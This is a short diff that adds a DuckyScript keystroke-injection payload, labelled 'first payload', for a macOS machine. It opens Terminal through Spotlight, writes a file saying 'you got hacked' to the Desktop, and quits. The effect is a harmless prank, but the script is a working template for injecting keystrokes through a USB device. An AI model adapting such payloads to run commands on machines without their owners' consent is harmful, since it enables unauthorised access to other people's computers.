@@ -1,0 +1,15 @@
+REM first payload
+REM
+REM
+DELAY 1000
+COMMAND SPACE
+DELAY 20
+STRING terminal
+DELAY 20
+ENTER
+DELAY 100
+STRING cd Desktop; echo “you got hacked” > hack
+DELAY 20
+ENTER
+DELAY 10
+COMMAND q
